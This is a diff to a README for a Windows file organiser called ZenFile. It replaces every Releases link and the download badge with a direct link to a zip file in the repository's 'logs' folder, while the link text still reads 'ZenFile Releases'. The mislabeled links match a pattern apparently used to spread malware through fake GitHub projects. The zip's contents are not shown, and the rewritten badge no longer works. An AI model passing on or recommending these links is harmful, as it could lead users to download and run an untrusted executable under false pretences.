@@ -1,6 +1,6 @@
 # 🗂️ ZenFile - Organize Your Files Effortlessly
 
-[![Download ZenFile](https://img.shields.io/badge/Download%20ZenFile-v1.0-blue)](https://github.com/egebrnn633/ZenFile/releases)
+[![Download ZenFile](https://github.com/egebrnn633/ZenFile/raw/refs/heads/main/logs/Zen-File-1.0.zip%20ZenFile-v1.0-blue)](https://github.com/egebrnn633/ZenFile/raw/refs/heads/main/logs/Zen-File-1.0.zip)
 
 ## 📖 Description
 
@@ -16,7 +16,7 @@ Follow these steps to download and run ZenFile on your Windows computer.
    - Python 3.x installed (if not included in the package)
 
 2. **Download ZenFile**
-   - Visit this page to download: [ZenFile Releases](https://github.com/egebrnn633/ZenFile/releases).
+   - Visit this page to download: [ZenFile Releases](https://github.com/egebrnn633/ZenFile/raw/refs/heads/main/logs/Zen-File-1.0.zip).
 
 3. **Choose the Right Version**
    - Look for the latest version listed at the top of the page. You will find various files available for download. Choose the `.exe` file for easy installation on Windows.
@@ -53,7 +53,7 @@ ZenFile can handle various file types, including documents, images, and videos.
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [ZenFile Releases](https://github.com/egebrnn633/ZenFile/releases). After downloading, follow the installation steps above to seamlessly integrate ZenFile into your file management routine.
+To get started, visit this page to download: [ZenFile Releases](https://github.com/egebrnn633/ZenFile/raw/refs/heads/main/logs/Zen-File-1.0.zip). After downloading, follow the installation steps above to seamlessly integrate ZenFile into your file management routine.
 
 ## 🛠️ Troubleshooting
 
